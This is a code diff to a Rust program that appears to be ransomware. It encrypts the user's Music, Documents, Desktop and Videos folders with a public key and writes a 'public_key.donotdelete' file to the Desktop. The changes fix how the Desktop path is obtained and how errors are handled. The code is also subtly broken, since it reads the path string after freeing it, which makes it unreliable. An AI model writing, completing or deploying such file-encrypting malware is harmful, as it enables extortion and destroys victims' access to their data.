@@ -11,19 +11,19 @@ use sodiumoxide::crypto::box_::{PublicKey};
 use windows::{
     core::PWSTR,
     Win32::{
-        Foundation::HANDLE,
-        UI::Shell::{SHGetKnownFolderPath, FOLDERID_Music, FOLDERID_Documents, FOLDERID_Desktop, FOLDERID_Videos},
+        UI::Shell::{SHGetKnownFolderPath, FOLDERID_Music, FOLDERID_Documents, FOLDERID_Desktop, FOLDERID_Videos, KNOWN_FOLDER_FLAG},
+        System::Com::CoTaskMemFree,
     },
 };
 
-fn desktop_file_path(filename: &str) -> PathBuf {
+fn desktop_file_path(filename: &str) -> Result<PathBuf> {
     unsafe {
-        let path: PWSTR = SHGetKnownFolderPath(&FOLDERID_Desktop, KNOWN_FOLDER_FLAG(0), HANDLE(0))?;
+        let path: PWSTR = SHGetKnownFolderPath(&FOLDERID_Desktop, KNOWN_FOLDER_FLAG(0), None)?;
         let desktop = path.to_string()?;
         CoTaskMemFree(Some(path.0 as _));
 
         let desktop = path.to_string().unwrap();
-        PathBuf::from(desktop).join(filename)
+        Ok(PathBuf::from(desktop).join(filename))
     }
 }
 
@@ -44,12 +44,12 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
             println!("path: {:?}", path_buf);
 
 
-            match encrypt_folder(path_buf, &pk) {
+            match encrypt_folder(&path_buf, &pk) {
                 Ok(_) => println!("✓ Successfully encrypted: {:?}", path),
                 Err(e) => println!("✗ Error encrypting {:?}: {}", path, e),
             }
 
-            let out_path = desktop_file_path("public_key.donotdelete");
+            let out_path = desktop_file_path("public_key.donotdelete")?;
             fs::write(out_path, &pk)?;
         }
     }
